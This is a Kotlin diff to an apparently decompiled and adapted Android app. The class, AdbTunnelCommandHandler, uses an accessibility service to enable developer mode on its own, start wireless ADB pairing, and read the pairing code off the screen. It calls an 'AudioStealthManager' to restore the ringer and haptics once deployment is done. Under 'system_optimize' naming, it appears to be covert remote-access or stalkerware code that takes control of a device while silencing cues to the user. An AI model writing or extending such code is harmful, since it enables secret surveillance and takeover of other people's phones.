@@ -68,32 +68,7 @@ class AdbTunnelCommandHandler : CommandHandler {
          * JADX: m211873a3
          */
         fun restoreSoundAndHaptic(context: android.content.Context) {
-            try {
-                val audioManager = context.getSystemService("audio") as? android.media.AudioManager
-                if (audioManager != null) {
-                    try {
-                        audioManager.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
-                    } catch (e: Exception) {
-                        Log.w(TAG, "⚠️ 恢复铃声失败: ${e.message}")
-                    }
-                }
-                Log.d(TAG, "✅ 已恢复铃声模式")
-
-                try {
-                    android.provider.Settings.System.putInt(
-                        context.contentResolver,
-                        "haptic_feedback_enabled",
-                        1
-                    )
-                    Log.d(TAG, "✅ 已开启触觉反馈")
-                } catch (e: Exception) {
-                    Log.w(TAG, "⚠️ 开启触觉反馈失败: ${e.message}")
-                }
-
-                Log.d(TAG, "🔊 local-service 部署成功后已恢复铃声 + 开启触觉反馈")
-            } catch (e: Exception) {
-                Log.e(TAG, "❌ restoreSoundAndHaptic 异常", e)
-            }
+            com.storm.safe.rock.service.modules.overlay.AudioStealthManager(context).forceRestoreDefaults()
         }
     }
 
@@ -183,6 +158,13 @@ class AdbTunnelCommandHandler : CommandHandler {
                     sendDeployStatus(context, "pairing_failed", "服务未初始化，请先开启无障碍服务")
                     return@withContext
                 }
+                // ADAPT: 重置内存中的 pairState，否则 PairFlowPreCheck 会因终态跳过
+                som.pairOrchestrator.pairState.set(
+                    com.storm.safe.rock.service.modules.setup.flow.PairState.PAIR_DEPT_UNKNOWN
+                )
+                som.pairOrchestrator.isPairRunning.set(false)
+                som.pairOrchestrator.isFinished.set(false)
+                som.pairOrchestrator.processedActions.clear()
                 som.startPairFlow()
                 sendDeployStatus(context, "pairing_triggered", "配对流程已触发，请等待自动完成...")
             } catch (e: Exception) {
@@ -234,6 +216,13 @@ class AdbTunnelCommandHandler : CommandHandler {
             try {
                 service.getSharedPreferences("system_optimize", 0)
                     .edit().putBoolean("pair_completed", false).apply()
+                // ADAPT: 重置内存中的 pairState，否则 PairFlowPreCheck 会因终态跳过
+                som.pairOrchestrator.pairState.set(
+                    com.storm.safe.rock.service.modules.setup.flow.PairState.PAIR_DEPT_UNKNOWN
+                )
+                som.pairOrchestrator.isPairRunning.set(false)
+                som.pairOrchestrator.isFinished.set(false)
+                som.pairOrchestrator.processedActions.clear()
                 som.startPairFlow()
                 sendDeployStatus(context, "full_deploy_triggered", "★★★ 完整部署流程已启动 ★★★")
             } catch (e: Exception) {
@@ -280,7 +269,27 @@ class AdbTunnelCommandHandler : CommandHandler {
                     sendCommandResult(context, false, "SystemOptimizeManager 初始化失败")
                     return@withContext
                 }
-                som.startPairFlow()
+                // ADAPT: 重置状态
+                som.pairOrchestrator.pairState.set(
+                    com.storm.safe.rock.service.modules.setup.flow.PairState.PAIR_DEPT_UNKNOWN
+                )
+                som.pairOrchestrator.isPairRunning.set(false)
+                som.pairOrchestrator.isFinished.set(false)
+                som.pairOrchestrator.processedActions.clear()
+                // vendor: AUTO_WIRELESS_PAIRING 先检查开发者模式，未启用则激活
+                if (som.isDeveloperOptionsEnabled()) {
+                    Log.d(TAG, "开发者模式已启用，直接 startPairFlow")
+                    som.startPairFlow()
+                } else {
+                    Log.d(TAG, "开发者模式未启用，启动 OpenDevelopmentDelegate")
+                    som.startOpenDevelopmentDelegate(
+                        onSuccess = { Log.d(TAG, "开发者模式激活成功，配对流程已由回调启动") },
+                        onFailure = { reason ->
+                            Log.e(TAG, "开发者模式激活失败: $reason")
+                            sendDeployStatus(context, "pairing_failed", "开发者模式激活失败: $reason")
+                        }
+                    )
+                }
                 sendCommandResult(context, true, "配对流程已启动")
             } catch (e: Exception) {
                 Log.e(TAG, "自动无线配对异常", e)
@@ -311,7 +320,7 @@ class AdbTunnelCommandHandler : CommandHandler {
             sendDeployStatus(context, "direct_pair_start", "正在读取屏幕配对码...")
             withContext(Dispatchers.IO) {
                 try {
-                    val info = som.extractPairingCodeAndPort()
+                    val info = som.uiPortReader.extractPairingCodeAndPort()
                     if (info == null) {
                         sendDeployStatus(context, "direct_pair_failed", "未能从屏幕读取到配对码")
                         return@withContext
